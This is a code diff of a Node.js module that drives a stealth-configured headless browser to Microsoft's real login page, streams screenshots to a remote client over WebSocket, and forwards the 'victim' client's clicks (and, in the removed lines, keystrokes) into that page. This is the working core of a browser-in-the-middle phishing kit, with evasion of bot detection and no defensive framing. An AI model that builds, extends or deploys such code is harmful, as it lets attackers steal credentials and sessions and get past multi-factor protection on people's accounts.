@@ -5,72 +5,60 @@ const axios = require('axios');
 puppeteer.use(StealthPlugin());
 
 async function startSession(io, socket) {
-    console.log(`[INIT] Starting session for ${socket.id}`);
+    console.log(`[STAGE 1] Triggering Browser Launch for ${socket.id}`);
     let browser;
 
     try {
-        // Optimized for Railway/Docker Production
+        // Optimized for Railway / Nixpacks environment
         browser = await puppeteer.launch({
-            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome', // Common Railway path
             headless: "new",
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
                 '--disable-dev-shm-usage',
                 '--disable-gpu',
-                '--no-first-run',
-                '--no-zygote',
-                '--single-process' 
+                '--single-process' // Reduces memory footprint in containers
             ]
         });
 
+        console.log(`[STAGE 2] Browser Active. Opening Page...`);
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
 
-        // Set a standard User Agent to avoid bot detection
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-
-        console.log(`[GOTO] Navigating to Microsoft...`);
+        console.log(`[STAGE 3] Navigating to Microsoft...`);
         await page.goto('https://login.microsoftonline.com/', { 
-            waitUntil: 'networkidle0',
-            timeout: 30000 
+            waitUntil: 'networkidle2', 
+            timeout: 60000 
         });
 
-        // Forced Render Function
-        const emitFrame = async () => {
+        // Function to push frames through the WebSocket
+        const pushFrame = async () => {
             try {
                 const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                 socket.emit('browser-render', { screenshot });
-                console.log(`[FRAME] Sent to ${socket.id}`);
             } catch (e) {
-                console.error("[!] Render Error:", e.message);
+                console.error("[!] Frame Sync Error:", e.message);
             }
         };
 
-        // Send the first frame immediately
-        await emitFrame();
+        // Send the very first frame
+        await pushFrame();
+        console.log(`[STAGE 4] First Frame Pushed to Socket.`);
 
         socket.on('victim-action', async (data) => {
-            try {
-                if (data.type === 'click') {
-                    await page.mouse.click(data.x, data.y);
-                } else if (data.type === 'type') {
-                    await page.type(data.selector || 'body', data.text, { delay: 50 });
-                }
-                // Always re-render after action
-                await emitFrame();
-            } catch (err) {
-                console.error('[!] Action Error:', err.message);
+            if (data.type === 'click') {
+                await page.mouse.click(data.x, data.y);
+                await pushFrame(); // Immediate feedback
             }
         });
 
         socket.on('disconnect', async () => {
-            console.log(`[EXIT] Closing browser for ${socket.id}`);
+            console.log(`[CLEANUP] Closing browser for ${socket.id}`);
             if (browser) await browser.close();
         });
 
     } catch (error) {
-        console.error('[CRITICAL FAILURE]', error.message);
+        console.error('[CRITICAL] Startup Failed:', error.message);
         socket.emit('error', { msg: "Environment setup failed" });
         if (browser) await browser.close();
     }
